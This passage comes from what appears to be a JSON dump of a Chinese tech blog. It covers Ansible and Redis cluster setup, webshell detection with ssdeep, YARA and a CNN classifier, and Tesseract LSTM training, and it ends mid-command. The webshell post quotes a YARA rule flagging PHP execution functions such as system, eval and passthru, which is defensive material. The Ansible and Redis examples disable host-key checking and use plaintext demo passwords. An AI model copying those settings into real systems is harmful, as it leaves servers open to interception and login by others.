failed_when: keyscan.rc != 0 or keyscan.stdout == &apos;&apos;</span><br><span class=\"line\">      changed_when: False</span><br><span class=\"line\">      when: keygen.rc == 1</span><br><span class=\"line\"></span><br><span class=\"line\">    - name: add ssh-key to local known_hosts</span><br><span class=\"line\">      lineinfile:</span><br><span class=\"line\">        name: ~/.ssh/known_hosts</span><br><span class=\"line\">        create: yes</span><br><span class=\"line\">        line: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class=\"line\">      when: keygen.rc == 1</span><br><span class=\"line\">      with_items: &apos;&#123;&#123; keyscan.stdout_lines|default([]) &#125;&#125;&apos;</span><br></pre></td></tr></table></figure>\n<p>你可以看到，头是这样写的<code>#!/usr/bin/env ansible-playbook</code>，这意味着，上面一段可以保存着<code>shell</code>脚本，然后执行即可。当然你也可以保存成纯粹的文本文件，然后用<code>ansible-playbook</code>去执行。</p>\n<p>执行过之后本机会添加所有指纹，主机配置在<code>/etc/ansible/hosts</code>,接着就可以执行相应的控制了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@master:~<span class=\"comment\"># ansible -i /etc/ansible/hosts slave -m ping --ask-pass -u ansible</span></span><br><span class=\"line\">SSH password: </span><br><span class=\"line\">45.76.222.2xx | SUCCESS =&gt; &#123;</span><br><span class=\"line\">    <span class=\"string\">\"changed\"</span>: <span class=\"literal\">false</span>, </span><br><span class=\"line\">    <span class=\"string\">\"ping\"</span>: <span class=\"string\">\"pong\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">45.76.197.1xx | SUCCESS =&gt; &#123;</span><br><span class=\"line\">    <span class=\"string\">\"changed\"</span>: <span class=\"literal\">false</span>, </span><br><span class=\"line\">    <span class=\"string\">\"ping\"</span>: <span class=\"string\">\"pong\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">root@master:~<span class=\"comment\"># ansible -i /etc/ansible/hosts slave -m shell -a 'date' --ask-pass -u ansible</span></span><br><span class=\"line\">SSH password: </span><br><span class=\"line\">45.76.197.1xx | SUCCESS | rc=0 &gt;&gt;</span><br><span class=\"line\">Fri Aug 11 07:12:43 UTC 2017</span><br><span class=\"line\"></span><br><span class=\"line\">45.76.222.2xx | SUCCESS | rc=0 &gt;&gt;</span><br><span class=\"line\">Fri Aug 11 07:12:43 UTC 2017</span><br></pre></td></tr></table></figure>\n<p>如果你在host里面写了用户名密码配置，就不再需要在命令行输入,配置文件里面这么写。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[defaults]</span><br><span class=\"line\">host_key_checking=false</span><br><span class=\"line\"></span><br><span class=\"line\">[all:vars]</span><br><span class=\"line\">ansible_connection=ssh</span><br><span class=\"line\">ansible_ssh_user=ansible</span><br><span class=\"line\">ansible_ssh_pass=test</span><br><span class=\"line\"></span><br><span class=\"line\">#hosts</span><br><span class=\"line\">[slave]</span><br><span class=\"line\">45.76.197.1xx</span><br><span class=\"line\">45.76.222.2xx</span><br></pre></td></tr></table></figure>\n<p>至于通过<code>ansible</code>命令行执行，可以参考附属链接。网上的一些<code>ansible</code>教程都忽略了一些东西。自己实践的时候就知道了。</p>\n<p><code>ansible -i inventory/production web -m shell -a &#39;date&#39; --ask-pass -uuser</code></p>\n<h4 id=\"后记-其他\"><a href=\"#后记-其他\" class=\"headerlink\" title=\"后记 : 其他\"></a>后记 : 其他</h4><p>以我说对找房子没有要求，其实是要求的，要求一个正常的环境。干干净净，安安静静。室内空气正常，不是甲醛超标到刺鼻，声音吵到带耳塞睡觉。厕所和厨房脏到自己打理，然后还是会变脏。仅此而已。这是有多么正常的事情。原来那些看起来很正常的事情背后有着这么多的努力。技术分享会也一样。<br>以前说对找工作没有要求，其实还是有要求的，希望有所成长。哎，很多事情变得不可预料了。</p>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources:\"></a>Resources:</h4><ul>\n<li><a href=\"https://blog.goquxiao.com/posts/2015/09/01/ansible-simple-tutorial/\" target=\"_blank\" rel=\"noopener\">Ansible Simple Tutorial</a></li>\n<li><a href=\"https://imlonghao.com/10.html\" target=\"_blank\" rel=\"noopener\">pyspider集群部署</a></li>\n</ul>\n<p>原文扯淡如下:</p>\n<blockquote>\n<p>如果要搭建mongo集群也差不多，注意下写法就行了。例如mongo中的<code>bind = [127.0.0.1, 10.99.0.11]</code></p>\n</blockquote>\n<p>We use three machices, Two of them was be setting as slave. </p>\n<h3 id=\"Step-1-Install-Redis-In-Ubuntu-16-04\"><a href=\"#Step-1-Install-Redis-In-Ubuntu-16-04\" class=\"headerlink\" title=\"Step 1: Install Redis In Ubuntu 16.04\"></a>Step 1: Install Redis In Ubuntu 16.04</h3><p>It can be easily  install by <code>apt-get</code>, And In vultr , You can setting it into StartupScripts, Just add this line</p>\n<pre><code>#!bin/bash\napt install -y redis-server\n</code></pre><p>Just directly deploy 3 instance , when server  was running , also redis-server was running. If you don’t know how to edit startup scripts,  you can just login into your instace , type <code>apt install -y redis-serve</code> , when installed was finished,<br>You would get  a redis server  instance.</p>\n<p>Note:</p>\n<ul>\n<li>For Security , You need enable the private network ,and shouldn’t expose it to public network.</li>\n</ul>\n<h3 id=\"Step-2-Configure-your-private-network\"><a href=\"#Step-2-Configure-your-private-network\" class=\"headerlink\" title=\"Step 2 :  Configure your private network\"></a>Step 2 :  Configure your private network</h3><p>When enable private network and deploy the instance, You would find the private network address from Instance  settings in the control  panel .But  private network  was not working before your configure. So we need edit the network interface, in ubuntu, you can do something like this:<br>       <code>vim /etc/network/interface</code></p>\n<p>Then add this line, In this example, my private network  address is <code>10.99.0.11</code>, you need chang it to your private  ip address . And same to another instance.</p>\n<pre><code>auto ens7\niface ens7 inet static\n       address 10.99.0.11\n       netmask 255.255.0.0\n       mtu 1450\n</code></pre><p>After change the <code>/etc/network/interface</code> , we need  restart the network services.<br><code>ifup ens7</code></p>\n<p>Note :</p>\n<ul>\n<li>Use <code>service  ssh start</code>, and You can use ssh and private network address to connect  your slave machine.</li>\n</ul>\n<h3 id=\"Step3-Configure-Redis-Cluster\"><a href=\"#Step3-Configure-Redis-Cluster\" class=\"headerlink\" title=\"Step3 :  Configure  Redis Cluster\"></a>Step3 :  Configure  Redis Cluster</h3><p>After step 1 and step2 , we already have a private network and three redis server, Now we need to connect it as a distributed  cluster.<br>Now , we begin to configure our redis server.  conf file was placed in <code>/etc/redis/redis.conf</code>,  First,  we need change the  <code>redis bind</code>, So, You need  change them use the private network address  as their binds.   You need bind it in each<br>instance <code>bind 10.99.0.10</code> or <code>bind 10.99.0.11</code> or  <code>bind 10.99.0.12</code>.  In this example , <code>10.99.0.10</code> was be consider as master , <code>10.99.0.11</code> and <code>10.99.0.12</code> was setting as slave . Next step was important tell the slave redis the master  redis  address and port. So , we need edit the conf file:</p>\n<ul>\n<li><p>In 10.99.0.11 /etc/redis/redis.conf :</p>\n<pre><code>slaveof 10.99.0.10 6379\n</code></pre></li>\n<li><p>In 10.99.0.12 /etc/redis/redis.conf:</p>\n<pre><code>slaveof 10.99.0.10 6379\n</code></pre></li>\n</ul>\n<p>Barring accidents, when you finished this type, the redis server was configure finished . And  you  can get a simple redis cluster. When you restart  your service ,<code>service redis-server restart</code>, It would be working  correctly .</p>\n<p>And  In the slave machine , Use <code>redis-cli -h 10.99.0.10 -p 6379</code>， You would connect the master redis,  To get<br> more  info , just type <code>INFO</code>, And redis would tell you something more.</p>\n<p>Note :</p>\n<ul>\n<li>For Security, You need edit redis conf and enable  password authorization.  <code>requirepass yourpass</code> , Therefore  you need edit slave conf with <code>masterauth &lt;master-password&gt;</code></li>\n</ul>\n<blockquote>\n<ul>\n<li>In 10.99.0.10 /etc/redis/redis.conf :<pre><code>`requirepass wohaha`\n</code></pre></li>\n<li>In 10.99.0.11 /etc/redis/redis.conf : <pre><code>`masterauth wohaha`\n</code></pre></li>\n<li>In 10.99.0.12 /etc/redis/redis.conf:<pre><code>`masterauth wohaha`\n</code></pre></li>\n</ul>\n</blockquote>\n","categories":["HowTo"],"tags":["学习笔记"]},{"title":"新开始:webshell的检测","url":"http://iami.xyz/2017/07/22/New-Begin-For-Nothing/","content":"<h4 id=\"前言-新的开始\"><a href=\"#前言-新的开始\" class=\"headerlink\" title=\"前言 : 新的开始\"></a>前言 : 新的开始</h4><p>6.25号开始新的工作，生活慢慢回到主旋律。Not bad,Not Good. 公司给配置了一台新的电脑，从抹上CPU的硅脂，到装上每一颗螺丝，再到<br>刻盘和点亮操作系统。我想像着像一台新的机器一样，开始全速运转。填充自己。</p>\n<h4 id=\"正文-如何开始\"><a href=\"#正文-如何开始\" class=\"headerlink\" title=\"正文 : 如何开始\"></a>正文 : 如何开始</h4><p>目前要做的软件包含一个模块，叫做webshell的检测。webshell的话就不用介绍了，日站的东西我的博客好像也从来没有介绍过。不跑题了。<br>webshell就暂且理解成恶意代码吧。实质上也就是恶意代码的检测。<br>针对不同的目标，出现了以下类别为代表的检测方法。</p>\n<ul>\n<li>基于日志的检测方法</li>\n<li>基于流量的检测方法</li>\n<li>基于行为的检测方法</li>\n</ul>\n<p>其实，我到网上看了看，真正有的并不多。一些少之又少的博客也只是大谈方法论和架构。而无论从方法还是架构上，都没有看到有较好的实现。当然，针对asp,jsp,php的可检测做的还是有一些做的蛮不错的。而从方法上划分上，我热为可以分为以下几种(记住，方法可以用在不同的目标上，流量监测可以用到这些方法，日志也可以用到这些方法。当然，理论上是看自己的设计了)</p>\n<ol>\n<li>基于文件相似度的(模糊hash计算)</li>\n<li>基于代码特征值(yara规则匹配)</li>\n<li>基于机器学习的方法(准确说是统计学的机器学习，不少人用朴素贝叶斯和SVM做恶意代码的分类，SVM作为工业级的算法产品，自然毋庸置疑，但是出于考虑到样本问题，还可能出现一些其他问题，例如特征选取，分词提取上的问题。)</li>\n</ol>\n<h5 id=\"正文二-如何检测\"><a href=\"#正文二-如何检测\" class=\"headerlink\" title=\"正文二 : 如何检测\"></a>正文二 : 如何检测</h5><p>下面就三种方法做一个简单</p>\n<ul>\n<li>基于文件相似度,采用<code>ssdeep</code></li>\n</ul>\n<p>基于文件相似度，实际即是考虑到<a href=\"http://blog.csdn.net/cwqbuptcwqbupt/article/details/7591818\" target=\"_blank\" rel=\"noopener\">模糊hash算法</a></p>\n<blockquote>\n<p>一个弱哈希算法，以及一个分片值，用于分片。一个强哈希算法，用于计算每片的哈希。一个压缩映射算法，将每片的哈希值映射为一个更短的值<br>一个比较算法，用于对两个模糊哈希值计算相似程度</p>\n</blockquote>\n<p>简单的讲，就是分片求哈希，然后连接重新计算哈希值。给出的链接里已经比较详细的介绍了该算法的问题。具体可以参考。下面介绍下<code>ssdeep</code>的使用。想使用ssdeep检验文件的相似性，必须首先把已有文件的特征值导出来。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">$ find ./php -<span class=\"built_in\">type</span> f -<span class=\"built_in\">exec</span> ssdeep -t 80 -bm php.ssdeep &#123;&#125; \\; </span><br><span class=\"line\">$ ssdeep -bsm  php.ssdeep  -r ./php -t 80 -c</span><br><span class=\"line\"><span class=\"comment\">#这两种写法是一致的，都是对一个文件夹内的所有文件进行校验。</span></span><br><span class=\"line\"></span><br><span class=\"line\">$ ssdeep -r *  \t\t\t\t\t</span><br><span class=\"line\"><span class=\"comment\"># 或者直接ssdeep * 即可将该文件夹下的所有特征值输出，如需保存，记得重定向到文件。</span></span><br></pre></td></tr></table></figure>\n<p>常用的就是这几个选项，其他的用法比较简单。</p>\n<ul>\n<li>基于代码特征值，采用<code>yara</code></li>\n</ul>\n<p>代码特征，主要是指恶意代码和正常代码由于目的性不同，可以通过文件内的代码类型来进行判断。例如，正常的php代码内是不会有大块的base64加密，也不会有大量的<code>eval</code>和<code>prg_replace</code>。因此，可以通过采用对已知危险的关键字进行匹配，语句进行匹配。从而来检测webshell，但是由于规则的通用性层面来讲，必然会出现不小的误报情况。Yara是谷歌开源的一款模式匹配引擎，可以对文本内容进行匹配，从而进行检测。当然，不止可以对于文本内容，还可以对二进制文件进行模式匹配，甚至还可以匹配内存中的某段值，来以此进行检验。是目前很屌的一款开源引擎。命令行使用的话，最简单的可以是 <code>yara -r ./xxx/rule/xxx.yar /target/directory</code>下面我们可以通过一段简单的针对php的yara规则进行分析。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rule DangerousPhp</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    strings:</span><br><span class=\"line\">        $system = &quot;system&quot; fullword nocase  // localroot bruteforcers have a lot of this</span><br><span class=\"line\"></span><br><span class=\"line\">        $ = &quot;array_filter&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;assert&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;backticks&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;call_user_func&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;eval&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;exec&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;fpassthru&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;fsockopen&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;function_exists&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;getmygid&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;shmop_open&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;mb_ereg_replace_callback&quot; fullword nocase</span><br><span class=\"line\">        $ = &quot;passthru&quot; fullword nocase</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从上面的规则(摘自<a href=\"https://github.com/nbs-system/php-malware-finder/blob/master/php-malware-finder/php.yar\" target=\"_blank\" rel=\"noopener\">php-malware-finder</a>)中可以看出，是对<code>eval</code>,<code>exec</code>,<code>assert</code>等关键词进行无大小命中，即可判断为危险PHP文件，同样，这种方法会导致误判率较高，因此需要采用白名单过滤的方法。通过对文件的md5或者sha1进行校验，存在白名单中，即可进行一定的过滤。例如，wordpress,joomla，discuz等等。规则的编写方式要<a href=\"http://yara.readthedocs.io/en/v3.6.0/writingrules.html\" target=\"_blank\" rel=\"noopener\">参考文档</a>，类C写法，还是比较简单易懂的。同时，我们可以利用已经公开的webshell的yara特征数据库进行检测，去提高正确率。yara还是需要详细的学习的。</p>\n<ul>\n<li>基于机器学习的方法</li>\n</ul>\n<p>当然，到最后。必不可少的要讲下机器学习的方法。目前主流是基于统计学的机器学习方法。此处，退一步讲，在文本分类上，采用朴素贝叶斯的较多，SVM也不乏有人在做。朴素贝叶斯是基于贝叶斯定理，计算先验概率和后验概率的。假设在事件A发生的情况下，事件B发生的概率。当然，算法理解后，工程实现一点也不难，因为有现成的库可以使用。但是此处，我们并没有采用朴素贝叶斯的方法。而是采用了一个<a href=\"https://github.com/dennybritz/cnn-text-classification-tf\" target=\"_blank\" rel=\"noopener\">基于CNN的文本二分类模型</a>。具体的网络设计可以查看论文。该模型是将已标记的文本按行输入，预处理之后读入第一层网络，网络的大小是以该行最长单词长度作为宽度，以单词个数作为长度，将其映射为一个二维向量，然后再进行单行的特征提取，然后对每一行进行选取特征。这个其实是基于word2vec实现的。最开始的时候，我也是打算采用word2vec，进行处理。在学习了TF-IDF和n-gram之后，也是突发奇想搜索了一下有没有基于文本直接进行分类的。恰好发现了这个项目，感谢作者。中间其实还有一些问题，比如文本文件无法读取等。不过还好，最后采用这个输出了一个比较好的结果。但是由于这个二维向量作为一个大的输入，如果你的文本稍长一些，就会导致非常之吃内存。然后崩掉。我是拿到服务器上，把样本读进去之后大概用了40G的内存。在本机时候是崩溃掉了。</p>\n<p>相对来讲ssdeep，yara来讲，这个是精确度最高的，并且针对ssdeep无法检测的小文件，也可以用其进行正确的判断。</p>\n<h4 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h4><p>这三种方法可以被应用到不同的检测目标上去，采用基于流量拦截的话，就去采集一批恶意请求的样本，之后是进行相似度校验，还是规则命中，或者采用机器学习。都是可以的。如果需要实时检测的话，可以通过对web服务提供一个中间件，把上传文件的请求经过该webshell检测中间件即可。可以部署成单独的微服务。从垂直方向拆分业务，并且将可维护成本降到最低。<br>总体来讲，效果还是不错。但是Yara和ssdeep对平台有一定的依赖性，所以分离到windows下使用有一定的麻烦。</p>\n<h4 id=\"遇到以及需要的问题\"><a href=\"#遇到以及需要的问题\" class=\"headerlink\" title=\"遇到以及需要的问题\"></a>遇到以及需要的问题</h4><ul>\n<li>ssdeep针对较小的文件不能生成有效的特征值</li>\n<li>yara可以针对单个文件的多条规则进行命中</li>\n<li>机器学习过程中样本较少</li>\n<li>白名单和规则应该由专人维护</li>\n<li>是否可以通过GAN网络，自动学习到并生成攻击性代码？</li>\n</ul>\n<h4 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h4><ul>\n<li><a href=\"https://github.com/nbs-system/php-malware-finder\" target=\"_blank\" rel=\"noopener\">php malware finder</a></li>\n<li><a href=\"https://github.com/VirusTotal/yara\" target=\"_blank\" rel=\"noopener\">yara</a></li>\n<li><a href=\"https://github.com/Neo23x0/yarGen\" target=\"_blank\" rel=\"noopener\">yarGen rule</a></li>\n<li><a href=\"https://github.com/emposha/Shell-Detector\" target=\"_blank\" rel=\"noopener\">Shell-Detector</a></li>\n<li><a href=\"https://github.com/dennybritz/cnn-text-classification-tf\" target=\"_blank\" rel=\"noopener\">CNN Text Classification</a></li>\n<li><a href=\"https://arxiv.org/abs/1408.5882v2\" target=\"_blank\" rel=\"noopener\">CNN Text Classification论文</a></li>\n<li><a href=\"http://ssdeep.sourceforge.net/\" target=\"_blank\" rel=\"noopener\">ssdeep</a></li>\n<li><a href=\"http://blog.csdn.net/cwqbuptcwqbupt/article/details/7591818\" target=\"_blank\" rel=\"noopener\">模糊hash算法</a></li>\n<li><a href=\"https://github.com/tennc/webshell\" target=\"_blank\" rel=\"noopener\">webshell</a></li>\n<li><a href=\"https://github.com/ysrc/webshell-sample\" target=\"_blank\" rel=\"noopener\">webshell-sample</a></li>\n<li><a href=\"https://github.com/fuzzdb-project/fuzzdb\" target=\"_blank\" rel=\"noopener\">fuzzdb</a></li>\n</ul>\n","categories":["HowTo 学习数据挖掘的路上"],"tags":["学习笔记","机器学习"]},{"title":"纯属折腾之——旧电脑折腾日记","url":"http://iami.xyz/2017/06/18/Review-S09-Simple-For-Mom/","content":"<h4 id=\"前言-旧电脑退休了\"><a href=\"#前言-旧电脑退休了\" class=\"headerlink\" title=\"前言 : 旧电脑退休了\"></a>前言 : 旧电脑退休了</h4><p>这两天租房子这小区维修水管，早上6点就突突突打电钻，突突的睡不着。真是折腾。<br>毕业了，旧电脑也退休了，收拾收拾放家里。嗯，就这样。</p>\n<h4 id=\"正文-如何开始\"><a href=\"#正文-如何开始\" class=\"headerlink\" title=\"正文 : 如何开始\"></a>正文 : 如何开始</h4><p>目标:</p>\n<ol>\n<li>字体大，容易操作,尽量不要有广告</li>\n<li>能看电视剧，听音乐，用用微信</li>\n<li>安全，不要被劫持，不要被钓鱼</li>\n</ol>\n<p>具体:<br>系统采用win10，删除不必要软件，优化系统性能。调整显示，安装常用软件，影音安全，禁止命令行，运行指定程序。</p>\n<ul>\n<li>拆了1T硬盘，换个500G的上去，把1T的拿来做移动硬盘</li>\n<li>装了个Win10系统，安装驱动精灵，安装完驱动卸载驱动精灵。</li>\n<li>桌面采用大图标</li>\n<li>Microsoft Edge缩放150</li>\n<li>删除系统输入法，只保留了搜狗输入法，老年版皮肤字体够大。而且可以语音输入</li>\n<li>屏蔽广告： PC屏蔽，和浏览器屏蔽。 Opera的内置了广告防护，电脑管家也带了广告防护</li>\n<li>装了个腾讯视频，微信，7zip</li>\n<li>装了个Lanuncy，本来还打算装个Everything，后来出于考虑不装了</li>\n<li>删除不必要的系统自带软件</li>\n<li>启动项优化</li>\n<li>组策略禁用安装程序，只允许运行指定程序，就是你刚刚安装的</li>\n<li>禁用了自动更新</li>\n<li>关闭家庭组</li>\n</ul>\n<h4 id=\"其他-两个问题\"><a href=\"#其他-两个问题\" class=\"headerlink\" title=\"其他: 两个问题\"></a>其他: 两个问题</h4><ul>\n<li>如何用批处理或powershell控制组策略？</li>\n<li>怎么更适宜中老年人用？</li>\n</ul>\n<h4 id=\"windows软件列表\"><a href=\"#windows软件列表\" class=\"headerlink\" title=\"windows软件列表:\"></a>windows软件列表:</h4><p>虽然自己整天玩linux，但是在windows下也折腾过一段时间，多取前人经验。</p>\n<ul>\n<li>Lanuncy</li>\n<li>Everything</li>\n<li>IDM </li>\n<li>EagleGet</li>\n<li>7Zip</li>\n<li>VLC / KMPlayer</li>\n<li>网易云 / Foobar</li>\n<li>FastCaputreStone</li>\n<li>Sublime Text3 / Notepad++</li>\n<li>f.lux</li>\n<li>Avast</li>\n<li>CCleaner</li>\n<li>Opera / Chrome</li>\n<li>IObit Unistaller</li>\n<li>TeamViewer</li>\n<li>XShell</li>\n<li>Git</li>\n<li>Sumatra PDF</li>\n</ul>\n<blockquote>\n<p>折腾好旧电脑，来记录下吧。</p>\n</blockquote>\n","categories":["HowTo"],"tags":["小手段"]},{"title":"OCR和用Tesseract训练chi_sim.traineddata","url":"http://iami.xyz/2017/06/16/Review-S05-Tesseract-lstm-traning-datafile/","content":"<h4 id=\"前言-Tesseract\"><a href=\"#前言-Tesseract\" class=\"headerlink\" title=\"前言:Tesseract\"></a>前言:Tesseract</h4><p>Tesseract 最新的版本4.0版本，新增了lstm训练方式。当时做毕设时经过一系列的其他挫折，刚好发现这个可以使用在嵌入式开发板上，因此去学习并使用了一下。</p>\n<h4 id=\"正文-一-OCR简介\"><a href=\"#正文-一-OCR简介\" class=\"headerlink\" title=\"正文 一: OCR简介\"></a>正文 一: OCR简介</h4><p>主要有两种方法</p>\n<ol>\n<li><p>Segment-Based method</p>\n<blockquote>\n<ul>\n<li>Template Matching for OCR</li>\n<li>Over-Segmentation</li>\n</ul>\n</blockquote>\n</li>\n<li><p>Segmentation-Free OCR</p>\n<blockquote>\n<ul>\n<li>Based On HMM</li>\n<li>Sequence Learning Approach</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<p>具体参考 <a href=\"https://kluedo.ub.uni-kl.de/files/4353/PhD_Thesis_Ul-Hasan.pdf\" target=\"_blank\" rel=\"noopener\">这篇论文</a>，我也是读了之后，才觉得更加清晰了。<br>总的来讲就是两种方法，传统基于图像分割的方式进行文本识别，基本是采用模板匹配的方式。通过解压图片训练出一些特征后经过一个分类器使其和已知的进行比较，计算之间的相似度，有多大概率。但是分割有时不容易控制间隔，会导致图像过分割，从而使识别出来的字符变形。例如，m和n还有d,在过分割的情况下就会导致d识别为c和l。详细的例子可以参考上面那篇论文论文。而基于自由分割的OCR识别则不关心输入的长度，虽然他依旧使用分割后的图片作为输入。然后得到输出作为识别后的结果。这种方式通常使用隐马尔科夫模型和循环卷积神经网络。标准的模式识别中通常采用近邻算法，决策树，贝叶斯分类作为训练方法。在后面几章里在浅显讲讲对这些基础算法的学习情况。</p>\n<font color=\"red\">下面所有操作，假设你已经安装好了最新版本的Tesseract，并且<code>clone</code>了相应的<code>langdata</code>和<code>tessdata</code>，并且放置在同一目录下。</font><br>使用百度云下载详情参考<code>http://iami.xyz/Review-S06-Baiduyun-download-Taolu/</code><br><br>#### 正文 二: Tesseract的普通训练方式<br>想去ProcessON上下载原图的时候，才发现自己忘了账号是什么了…虽然当时只是作为临时存毕设的流程图用，但也是大意了。<br><img src=\"/images//Tesseract/common_01.png\" alt=\"default_flow\"><br><br>这就是默认的训练的流程，具体的也已经在流程图绘制的比较详细了。同样下图是每一步对应的操作。相关代码我已经放在了<code>gist</code>上，可以自行查看，包括生成图片和普通的训练链接为<code>https://gist.github.com/mylamour/e4f116e64d690c366715f67fefc8357f</code><br><br><img src=\"/images//Tesseract/common_02.png\" alt=\"default_flow_code\"><br><br><br><font color=\"red\"> 注意事项 </font>\n\n<ul>\n<li>最后合并时要和之前训练好的文件放置在同一文件夹 </li>\n<li>自己由字体生成训练图片去训练的话，图片像素不宜过大。否则训练的时候，耗时不仅久，而且会占大量内存。</li>\n<li>普通训练只占用单核，所以非常慢。</li>\n</ul>\n<h4 id=\"正文-三-tesseract的LSTM训练方式\"><a href=\"#正文-三-tesseract的LSTM训练方式\" class=\"headerlink\" title=\"正文 三: tesseract的LSTM训练方式\"></a>正文 三: tesseract的LSTM训练方式</h4><p><img src=\"/images//Tesseract/default_lstm.png\" alt=\"default_lstm\"></p>\n<p>这张图是按照官网给出的vgslspecs的语法，并结合官方文档介绍，自己推测画出来的。可能有错误，需要大牛指正。下面这张图展示了LSTM的cell的变化，LSTM是RNN的一种，更详细的需要参考后面的附录。我只能做个简单的介绍放在上面，数学功底有限，不宜妄言。只有理解了之后，才能重新设计一个新的网络去使用。</p>\n<ul>\n<li>LSTM的训练方式也有两种，一种是从头开始，自己设计一个网络。一种是从现有的字库种提取出lstm模型，然后进行修改，重新训练，合并出新的字体。此处我们选用第二种。之所以没有选用第一种，是因为从scratch训练需要运行scrollView.jar包，而这个包运行时必须需要物理显示器，也就是<code>0</code>位置的，像vnc之类的都是<code>0:1</code>或者<code>0:2</code>之类的，是不可以的。而我的服务器不仅没有物理显示器，而且我的真个环境是在自己的<code>docker</code>里面运行的。出于一系列问题，只能选第二种。</li>\n</ul>\n<p><img src=\"/images//Tesseract/lstm_01.gif\" alt=\"lstm\"></p>\n<p>下面介绍如何进行训练。首先你需要生成一个训练集和一个测试集，下面的部分截图来自我论文里。</p>\n<ul>\n<li><p>step 1: 生成训练集和测试集</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ tesstrain.sh --fonts_dir /usr/share/fonts/ch_2000/ --lang chi_sim --linedata_only   --noextract_font_properties --langdata_dir /home/langdata   --tessdata_dir ./tessdata --output_dir /home/lstmtest/400type/chitrain</span><br><span class=\"line\">$ tesstrain.sh --fonts_dir /usr/share/fonts/ch_2000/ --lang chi_sim --linedata_only   --noextract_font_properties --langdata_dir /home/langdata   --tessdata_dir ./tessdata --font-list <span class=\"string\">\"STXinwei\"</span> --output_dir /home/lstmtest/400type/chitrain</span><br><span class=\"line\"><span class=\"comment\">#从这里就可以很明细的看出，如果不指定特定的字体的话，就会直接生成整个字体文件下的所有字体。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>step 2: 从已有的字库数据里提取模型</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ combine_tessdata -e \\</span><br><span class=\"line\">\t\t/usr/<span class=\"built_in\">local</span>/share/tessdata/chi_sim.traineddata \\</span><br><span class=\"line\">\t\t./chi_sim.lstm</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>step 3: 从已有模型开始训练</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ lstmtraining -U ./chitrain/chi_sim.unicharset \\</span><br><span class=\"line\">\t  --script_dir ../langdata --debug_interval 0 \\</span><br><span class=\"line\">\t  --continue_from ./tranlayer/chi_sim.lstm \\</span><br><span class=\"line\">\t  --append_index 5 --net_spec <span class=\"string\">'[Lfx256 O1c105]'</span> \\</span><br><span class=\"line\">\t  --model_output ./ \\</span><br><span class=\"line\">\t  --train_listfile ./chitrain/chi_sim.training_files.txt\\</span><br><span class=\"line\">\t  --max_iterations 500000</span><br><span class=\"line\"><span 